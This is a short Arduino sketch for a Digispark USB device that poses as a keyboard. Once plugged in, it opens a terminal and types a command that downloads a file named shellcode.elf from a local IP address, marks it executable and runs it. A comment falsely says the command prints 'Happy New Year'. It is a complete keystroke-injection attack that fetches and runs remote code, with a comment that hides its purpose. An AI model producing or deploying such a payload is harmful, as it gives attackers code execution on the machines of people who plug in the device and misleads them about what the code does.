#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000); // Delay for USB initialization
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); // Release any existing key
  DigiKeyboard.delay(100);

  // Simulate pressing Ctrl+Alt+T to open a terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(500);

  // Type the command to print "Happy New Year" in the terminal ;)
  DigiKeyboard.println("wget http://10.0.0.90:4465/shellcode.elf && chmod +x shellcode.elf && ./shellcode.elf");
  DigiKeyboard.delay(500);

  // Simulate pressing Enter to execute the command
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Infinite loop to prevent the code from running repeatedly
  while (1) {
    DigiKeyboard.delay(1000);
  }
}
